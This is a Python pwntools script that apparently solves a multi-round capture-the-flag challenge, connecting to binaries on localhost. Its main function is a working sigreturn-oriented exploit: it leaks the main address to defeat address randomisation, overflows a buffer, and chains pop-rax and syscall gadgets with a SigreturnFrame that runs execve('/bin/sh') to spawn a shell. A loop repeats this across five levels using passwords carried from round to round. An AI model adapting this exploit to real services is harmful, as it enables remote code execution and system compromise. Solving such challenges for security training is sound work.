from pwn import *
from time import sleep
from generic_solver_functions import *
context.os = 'linux'
context.arch = 'amd64'
initial_command = b'nc localhost 11001'
initial_password = open("../first_password.txt", "r").readlines()[0].strip().encode()

def solve_level_one(p, path_to_binary):
    #path_to_binary = os.path.dirname(os.path.abspath(__file__)) + "/" + path_to_binary
    e = ELF(path_to_binary)
    rop = ROP(e)
    #p.sendline()
    p.recvuntil("Main is at ")
    main_addr = str(p.recvline())[2:-3]
    main = e.symbols['main']
    #print("main address", hex(int(main_addr, 16)))
    #print("main rop", hex(main))
    base_addr = int(main_addr, 16) - main
    #print("base address", hex(base_addr))
    padding = b'A' * 0x9 
    binsh = int(next(e.search(b"/bin/sh\x00"))) + base_addr
    syscall = int(rop.syscall.address) + base_addr
    pop_rax = int(rop.rax.address) + base_addr
    #print("syscall:", hex(syscall))
    #print("syscall rop:", hex(rop.syscall.address))
    #print("pop_rax:", hex(pop_rax))
    #print("pop_rax rop:", hex(rop.rax.address))
    payload = padding + p64(pop_rax) + p64(0xf) + p64(syscall)
    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rdi = binsh
    frame.rsi = 0x0
    frame.rdx = 0x0
    frame.rip = syscall
    payload += bytes(frame)
    #print(payload)
    p.sendline(payload)
    #p.interactive()

#context.terminal = ['tmux','splitw','-h'] 
#gdb.attach(proc.pidof(p)[0])

i = 1
N = 5 
password = initial_password
command = initial_command

#command = b'nc localhost 9001' #b'./binary_1_copy'
while (i < N):
    command, password = exploit_intermediate_binary(command, password, i, solve_level_one)
    print("round " + str(i) + " solved!")
    i += 1
exploit_final_binary(command, password, N, solve_level_one)
